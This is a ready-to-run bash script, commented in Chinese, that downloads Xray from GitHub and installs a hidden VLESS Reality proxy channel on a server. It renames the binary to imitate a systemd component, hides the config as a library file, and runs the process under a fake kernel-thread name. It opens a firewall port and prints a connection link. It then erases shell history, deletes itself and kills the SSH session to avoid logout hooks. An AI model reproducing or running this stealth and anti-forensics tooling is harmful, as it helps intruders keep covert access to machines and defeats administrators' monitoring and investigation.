#!/bin/bash

# 1. 自动获取 VPS 的公网 IP
VPS_IP=$(curl -s https://api.ipify.org || curl -s https://ifconfig.me)
if [ -z "$VPS_IP" ]; then
    echo "错误：无法获取服务器公网 IP，请手动检查网络。"
    exit 1
fi

# 2. 定义隐藏路径、伪装名称和随机端口
BIN_PATH="/usr/sbin/systemd-journal-transport"
CONF_PATH="/usr/lib/locale/en_US.utf8/libstdc++.so.6.0.29.conf"
PORT=58321
UUID="be59b75e-2742-4994-9850-620161effd93"
DEST_DOMAIN="images.apple.com"
SHORT_ID="ca7266ec33152320"

# 3. 静默下载最新版核心
curl -s -L -o /tmp/sys_core.zip https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip
apt-get update >/dev/null 2>&1 && apt-get install unzip -y >/dev/null 2>&1
unzip -q /tmp/sys_core.zip -d /tmp/sys_core_extract

# 4. 移动并伪装二进制文件
mv /tmp/sys_core_extract/xray $BIN_PATH
chmod +x $BIN_PATH
rm -rf /tmp/sys_core.zip /tmp/sys_core_extract

# 5. 运行时自动动态生成 Reality 密钥对
KEY_PAIR=$($BIN_PATH x25519)
PRIVATE_KEY=$(echo "$KEY_PAIR" | grep "Private key:" | awk '{print $3}')
PUBLIC_KEY=$(echo "$KEY_PAIR" | grep "Public key:" | awk '{print $3}')

# 6. 自动写入隐藏的 Reality 配置文件
cat << EOF > $CONF_PATH
{
  "inbounds": [
    {
      "port": $PORT,
      "protocol": "vless",
      "settings": {
        "clients": [{"id": "$UUID", "flow": "xtls-rprx-vision"}],
        "decryption": "none"
      },
      "streamSettings": {
        "network": "tcp",
        "security": "reality",
        "realitySettings": {
          "show": false,
          "dest": "$DEST_DOMAIN:443",
          "xver": 0,
          "serverNames": ["$DEST_DOMAIN"],
          "privateKey": "$PRIVATE_KEY",
          "shortIds": ["$SHORT_ID"]
        }
      }
    }
  ]
}
EOF

# 7. 使用 exec -a 伪装成内核线程静默启动
(exec -a "[kworker/1:2-events]" $BIN_PATH -config $CONF_PATH >/dev/null 2>&1 &)

# 8. 自动放行外部防火墙端口（UFW/Iptables）
if command -v ufw >/dev/null 2>&1; then
    ufw allow $PORT/tcp >/dev/null 2>&1
fi

# 9. 自动拼接并输出节点链接
clear
echo "=================================================="
echo "         系统补丁更新完成 (隐藏通道已就绪)          "
echo "=================================================="
echo ""
echo "请复制以下链接导入客户端使用："
echo ""
echo "vless://${UUID}@${VPS_IP}:${PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DEST_DOMAIN}&fp=chrome&pbk=${PUBLIC_KEY}&sid=${SHORT_ID}&type=tcp#%E9%9A%90%E8%94%BD%E9%80%9A%E9%81%93"
echo ""
echo "=================================================="
echo ""

# 10. 核心等待交互：按回车启动毁灭清理机制
read -r -p "【请在复制完链接后，按 [Enter/回车键] 彻底清理痕迹并退出】"

# ----------------- 痕迹毁灭核心 -----------------

# A. 清除可能由管道产生的内存残余、清空终端屏幕历史缓冲区
clear
printf "\033c"

# B. 强行截断并抹除当前 Session 的 bash 历史，确保不写入 ~/.bash_history
if [ -n "$BASH_VERSION" ]; then
    history -c
    history -w
fi

# C. 文件级自毁（如果脚本是以实体文件运行的）
rm -f "$0" 2>/dev/null

# D. 终极自毁：向当前 SSH 会话的父 PID 发送死亡信号，拒绝触发任何 shell 正常退出的 logout 钩子
kill -9 $PPID
